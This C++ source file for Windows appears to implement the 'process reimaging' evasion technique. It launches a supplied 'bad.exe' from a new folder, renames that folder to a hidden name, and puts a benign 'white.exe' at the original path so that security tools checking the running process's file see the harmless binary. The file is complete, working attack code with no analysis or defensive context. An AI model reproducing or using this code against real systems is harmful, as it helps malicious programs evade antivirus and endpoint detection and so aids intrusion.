/*
*  Use: process_reimaging.exe x:\xxx\bad.exe x:\xxx\white.exe
*/
#include <Windows.h>
#include <iostream>
#include <string>

const bool CGetCurrentDirectory(std::string& strDirpath)
{
	char szModule[1024] = { 0, };
	GetModuleFileNameA(NULL, szModule, sizeof(szModule) / sizeof(char));
	strDirpath = szModule;
	if (0 >= strDirpath.size())
	{
		OutputDebugString(L"GetModuleFileNameA Error");
		return 0;
	}
	size_t offset = strDirpath.rfind("\\");
	if (0 >= offset)
	{
		OutputDebugString(L"GetModuleFileNameA Size < 0");
		return 0;
	}
	strDirpath = strDirpath.substr(0, offset + 1);
	return true;
}

int main(int argc, char* argv[])
{
	if (argc < 3) {
		std::cout << "[-] Parameter Path Error..." << std::endl;
		return 0;
	}

	const std::string sBadExePath = argv[1];
	if (sBadExePath.empty()) {
		std::cout << "[-] Parameter badExe Path Error..." << std::endl;
		return 0;
	}

	const std::string sWhiteExePath = argv[2];
	if (sWhiteExePath.empty()) {
		std::cout << "[-] Parameter WhiteExe Path Error..." << std::endl;
		return 0;
	}

	// 1. create bad.exe directory && createprocess bad.exe
	std::string strCurrentDir = "";
	CGetCurrentDirectory(strCurrentDir);
	if (strCurrentDir.empty())
		strCurrentDir = "C:\\Windows\\";
	const std::string strBadOldDirPath = (strCurrentDir + "Bad").c_str();
	int res = CreateDirectoryA(strBadOldDirPath.c_str(), NULL);
	if ((res == 0) && !(GetLastError() == ERROR_ALREADY_EXISTS)) {
		std::cout << "[-] Error creating directory: " << strBadOldDirPath.c_str() << std::endl;
		return 0;
	}

	const std::string strBadExeFullPath = (strBadOldDirPath + "\\bad.exe").c_str();
	BOOL boolRes = CopyFileA(sBadExePath.c_str(), strBadExeFullPath.c_str(), FALSE);
	if (!boolRes) {
		std::cout << "[-] Could not copy " << sBadExePath << " to " << strBadExeFullPath << std::endl;
		return 0;
	}

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	res = CreateProcessA(NULL, (LPSTR)strBadExeFullPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (res == 0) {
		DWORD err = GetLastError();
		std::cout << "[-] Error creating process: " << err << std::endl;
		return 0;
	}
	if (pi.hProcess) {
		CloseHandle(pi.hProcess);
	}
	if (pi.hThread) {
		CloseHandle(pi.hThread);
	}

	// 2. rename bad.exe directory path to new directory
	const std::string strNewBadDirFullPath = (strCurrentDir + ".Bad").c_str();
	boolRes = MoveFileA(strBadOldDirPath.c_str(), strNewBadDirFullPath.c_str());
	if (!boolRes) {
		DWORD err = GetLastError();
		std::cout << "[-] Failed to move file to hidden directory:" << err << std::endl;
		return 0;
	}

	// 3. create old bad.exe directory & copy  white.exe
	res = CreateDirectoryA(strBadOldDirPath.c_str(), NULL);
	if ((res == 0) && !(GetLastError() == ERROR_ALREADY_EXISTS)) {
		std::cout << "[-] Error creating directory: " << strBadOldDirPath.c_str() << std::endl;
		return 0;
	}

	boolRes = CopyFileA(sWhiteExePath.c_str(), strBadExeFullPath.c_str(), FALSE);
	if (!boolRes) {
		std::cout << "[-] Could not copy " << sBadExePath << " to " << strBadOldDirPath << std::endl;
		return 0;
	}
	return 0;
}